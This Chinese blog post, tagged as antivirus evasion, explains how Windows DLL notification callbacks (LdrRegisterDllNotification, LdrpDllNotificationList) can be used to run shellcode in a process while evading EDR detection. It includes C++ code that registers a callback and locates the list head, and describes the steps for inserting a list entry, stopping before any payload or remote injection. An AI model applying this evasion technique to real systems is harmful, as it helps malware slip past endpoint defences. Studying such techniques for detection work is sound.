<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>利用dll通知回调加载shellcode | infinite</title><meta name="author" content="helson"><meta name="copyright" content="helson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="在 Windows 操作系统中，当一个 DLL（动态链接库）被加载或卸载时，系统会调用一个预先注册的回调函数来通知应用程序。在Windows用户态下，通常使用LdrRegisterDllNotification函数来注册回调函数。一些EDR产品也是使用此函数在用户态下从加载DLL事件中获取监测数据。函数的实现与数据结构的构造代码： 123456789101112131415161718192021">
<meta property="og:type" content="article">
<meta property="og:title" content="利用dll通知回调加载shellcode">
<meta property="og:url" content="https://helsome.gihub.io/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/index.html">
<meta property="og:site_name" content="infinite">
<meta property="og:description" content="在 Windows 操作系统中，当一个 DLL（动态链接库）被加载或卸载时，系统会调用一个预先注册的回调函数来通知应用程序。在Windows用户态下，通常使用LdrRegisterDllNotification函数来注册回调函数。一些EDR产品也是使用此函数在用户态下从加载DLL事件中获取监测数据。函数的实现与数据结构的构造代码： 123456789101112131415161718192021">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://helsome.gihub.io/hexo-blog/source/avatar%20img.jpg">
<meta property="article:published_time" content="2024-10-25T10:50:38.000Z">
<meta property="article:modified_time" content="2024-10-25T11:25:20.639Z">
<meta property="article:author" content="helson">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://helsome.gihub.io/hexo-blog/source/avatar%20img.jpg"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://helsome.gihub.io/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '利用dll通知回调加载shellcode',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-25 19:25:20'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/hexo-blog/source/avatar%20img.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="infinite"><span class="site-name">infinite</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">利用dll通知回调加载shellcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-25T10:50:38.000Z" title="发表于 2024-10-25 18:50:38">2024-10-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-25T11:25:20.639Z" title="更新于 2024-10-25 19:25:20">2024-10-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="利用dll通知回调加载shellcode"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>在 Windows 操作系统中，当一个 DLL（动态链接库）被加载或卸载时，系统会调用一个预先注册的回调函数来通知应用程序。在Windows用户态下，通常使用<code>LdrRegisterDllNotification</code>函数来注册回调函数。<br><em>一些EDR产品也是使用此函数在用户态下从加载DLL事件中获取监测数据。</em><br>函数的实现与数据结构的构造代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STR</span></span><br><span class="line">&#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR pBuffer;</span><br><span class="line">&#125; UNICODE_STR, * PUNICODE_STR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DLL_LOADED_NOTIFICATION_DATA</span> &#123;</span><br><span class="line">    ULONG           Flags;             <span class="comment">// Reserved.</span></span><br><span class="line">    PUNICODE_STR FullDllName;       <span class="comment">// The full path name of the DLL module.</span></span><br><span class="line">    PUNICODE_STR BaseDllName;       <span class="comment">// The base file name of the DLL module.</span></span><br><span class="line">    PVOID           DllBase;           <span class="comment">// A pointer to the base address for the DLL in memory.</span></span><br><span class="line">    ULONG           SizeOfImage;       <span class="comment">// The size of the DLL image, in bytes.</span></span><br><span class="line">&#125; LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DLL_UNLOADED_NOTIFICATION_DATA</span> &#123;</span><br><span class="line">    ULONG           Flags;             <span class="comment">// Reserved.</span></span><br><span class="line">    PUNICODE_STR FullDllName;       <span class="comment">// The full path name of the DLL module.</span></span><br><span class="line">    PUNICODE_STR BaseDllName;       <span class="comment">// The base file name of the DLL module.</span></span><br><span class="line">    PVOID           DllBase;           <span class="comment">// A pointer to the base address for the DLL in memory.</span></span><br><span class="line">    ULONG           SizeOfImage;       <span class="comment">// The size of the DLL image, in bytes.</span></span><br><span class="line">&#125; LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> <span class="title class_">_LDR_DLL_NOTIFICATION_DATA</span> &#123;</span><br><span class="line">    LDR_DLL_LOADED_NOTIFICATION_DATA   Loaded;</span><br><span class="line">    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;</span><br><span class="line">&#125; LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PLDR_DLL_NOTIFICATION_FUNCTION`是一个函数指针类型，指向DLL通知回调函数。该函数接收三个参数：通知原因、通知数据和一个上下文指针。</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(CALLBACK* PLDR_DLL_NOTIFICATION_FUNCTION)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG                       NotificationReason,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLDR_DLL_NOTIFICATION_DATA  NotificationData,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID                       Context)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DLL_NOTIFICATION_ENTRY</span> &#123;</span><br><span class="line">    LIST_ENTRY                     List;</span><br><span class="line">    PLDR_DLL_NOTIFICATION_FUNCTION Callback;</span><br><span class="line">    PVOID                          Context;</span><br><span class="line">&#125; LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* _LdrRegisterDllNotification)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG                          Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID                          Context,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID* Cookie)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* _LdrUnregisterDllNotification)</span><span class="params">(PVOID Cookie)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数，当回调被触发时，它仅打印出加载的DLL的基础文件名。</span></span><br><span class="line"><span class="function">VOID <span class="title">MyCallback</span><span class="params">(ULONG NotificationReason, <span class="type">const</span> PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[MyCallback] dll loaded: %Z\n&quot;</span>, NotificationData-&gt;Loaded.BaseDllName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// `GetModuleHandleA`函数用于获取`ntdll.dll`模块的句柄，这是调用`LdrRegisterDllNotification`和`LdrUnregisterDllNotification`函数所必需的。</span></span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNtdll != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到 LdrUnregisterDllNotification函数地址</span></span><br><span class="line">        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;LdrRegisterDllNotification&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将MyCallback函数注册为 DLL 通知回调</span></span><br><span class="line">        PVOID cookie;</span><br><span class="line">        NTSTATUS status = <span class="built_in">pLdrRegisterDllNotification</span>(<span class="number">0</span>, (PLDR_DLL_NOTIFICATION_FUNCTION)MyCallback, <span class="literal">NULL</span>, &amp;cookie);</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully registered callback\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//字符中断</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Press enter to continue\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载其他dll来触发回调函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Loading USER32 DLL now\n&quot;</span>);</span><br><span class="line">        <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;USER32.dll&quot;</span>);</span><br><span class="line">        <span class="comment">//通过调用`LoadLibraryA`加载`USER32.dll`，这将触发之前注册的`MyCallback`回调函数。由于`MyCallback`打印了加载的DLL名称，这将证实回调函数已被成功触发。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/3ddfa8dcd2d0756e6265f4a48b2094b0.png"></p>
<p>传统进程注入四步法：</p>
<ul>
<li>获取远程进程句柄（OpenProcess函数）</li>
<li>在远程进程中分配内存（VirtualAllocEx函数）</li>
<li>将shellcode复制到远程进程中新分配的内存页中（WriteProcessMemory函数）</li>
<li>在远程进程中创建线程执行shellcode（CreateRemoteThread函数）</li>
</ul>
<p>杀毒软件和EDR产品已经学会通过快速查找这四步操作来概括并检测进程注入。<br>ThreadlessInject：<strong>Hook并修改远程进程中线程创建与销毁过程中DLL加载的入口点，进而加载我们的shellcode</strong>。（将dll入口点重定向至注入的shellcode）</p>
<h2 id="注册自定义回调函数"><a href="#注册自定义回调函数" class="headerlink" title="注册自定义回调函数"></a>注册自定义回调函数</h2><p>**<em>进程中已注册的所有回调函数都存储在<code>LdrpDllNotificationList</code>（双向链表）中，并通过指向上一个和下一个回调的<code>LIST_ENTRY</code>结构体链接在一起。其中每个节点代表一个 DLL 通知，每个节点包含有关 DLL 模块、通知类型（例如 DLL 加载、卸载）等信息。当一个 DLL 被加载或卸载时，系统会遍历这个链表，并调用其中的每个回调函数，以通知应用程序有关 DLL 加载或卸载的信息。这个链表中的每个节点都是一个 <code>LDR_DLL_NOTIFICATION_ENTRY</code> 类型的结构体，它包含两个成员：<code>List</code> 和 <code>NotificationFunction</code>。其中，<code>List</code> 是一个 <code>LIST_ENTRY</code> 类型的结构体，用于将节点链接到链表中。<code>NotificationFunction</code> 是一个指向回调函数的指针，它指定了当 DLL 加载或卸载时要调用的函数。</em></p>
<p>完整流程解释：在当前进程中使用 <code>LdrRegisterDllNotification</code> 函数注册一个 DLL 通知回调函数时，这个函数会在 <code>LdrpDllNotificationList</code> 链表中添加一个新节点，并将其 <code>NotificationFunction</code> 成员设置为自定义的回调函数。当 DLL 加载或卸载时，系统会遍历这个双向链表，并调用其中的每个回调函数。**</p>
<h2 id="找到链表的头部"><a href="#找到链表的头部" class="headerlink" title="找到链表的头部"></a>找到链表的头部</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DummyCallback</span><span class="params">(ULONG NotificationReason, <span class="type">const</span> PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 LdrpDllNotificationList头部地址</span></span><br><span class="line"><span class="function">PLIST_ENTRY <span class="title">GetDllNotificationListHead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PLIST_ENTRY head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取NTDLL句柄</span></span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNtdll != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到LdrRegisterDllNotification函数</span></span><br><span class="line">        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;LdrRegisterDllNotification&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到 LdrUnregisterDllNotification函数</span></span><br><span class="line">        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;LdrUnregisterDllNotification&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将回调函数注册为 DLL 通知回调</span></span><br><span class="line">        PVOID cookie;</span><br><span class="line">        NTSTATUS status = <span class="built_in">pLdrRegisterDllNotification</span>(<span class="number">0</span>, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, <span class="literal">NULL</span>, &amp;cookie);</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully registered dummy callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Cookie is the last callback registered so its Flink holds the head of the list.</span></span><br><span class="line">            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)-&gt;List.Flink;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found LdrpDllNotificationList head: %p\n&quot;</span>, head);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 卸载回调函数</span></span><br><span class="line">            status = <span class="built_in">pLdrUnregisterDllNotification</span>(cookie);</span><br><span class="line">            <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully unregistered dummy callback\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="编写代码操纵目标进程内存执行shellcode"><a href="#编写代码操纵目标进程内存执行shellcode" class="headerlink" title="编写代码操纵目标进程内存执行shellcode"></a>编写代码操纵目标进程内存执行shellcode</h2><p><code>LDR_DLL_NOTIFICATION_ENTRY</code>结构体，<code>LIST_ENTRY</code>的属性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DLL_NOTIFICATION_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY                     List;</span><br><span class="line">    PLDR_DLL_NOTIFICATION_FUNCTION Callback;</span><br><span class="line">    PVOID                          Context;</span><br><span class="line">&#125; LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>每个<code>_LDR_DLL_NOTIFICATION_ENTRY</code>条目都有一个属性 List，而 <code>List</code>属性本身就是一个<code>LIST_ENTRY</code>类型的结构，继续套娃，<code>LIST_ENTRY</code>又有两个属性：</p>
<ul>
<li>1.<strong>Flink</strong>（Forward Link,前向链），保存指向list中下一个entry条目的指针</li>
<li>2.<strong>Blink</strong>（Backward Link,后向链），保存指向list中上一个entry条目的指针</li>
</ul>
<p>当使用<code>LdrRegisterDllNotification</code>注册回调函数时，实际调用过程如下：</p>
<p>1.为新创建的entry条目分配一个新的 LDR_DLL_NOTIFICATION_ENTRY 结构<br>2.设置<strong>Callback属性</strong>为指向我们自定义的回调函数<br>3.设置<strong>Context属性</strong>为指向所提供的上下文（如果有的话）<br>4.设置<strong>List.Blink属性</strong>为指向LdrpDllNotificationList中最后一个LDR_DLL_NOTIFICATION_ENTRY条目<br>5.更改在LdrpDllNotificationList中最后一个 LDR_DLL_NOTIFICATION_ENTRY 条目的<strong>List.Flink属性</strong>为指向我们新创建的entry条目<br>6.设置<strong>List.Flink属性</strong>为指向<strong>LdrpDllNotificationList的头部</strong>（双向链表中的最后一个链接应始终指向列表的头部）。<br>7.更改<strong>LdrpDllNotificationList头</strong>的<strong>List.Blink属性</strong>为指向我们新创建的条目</p>
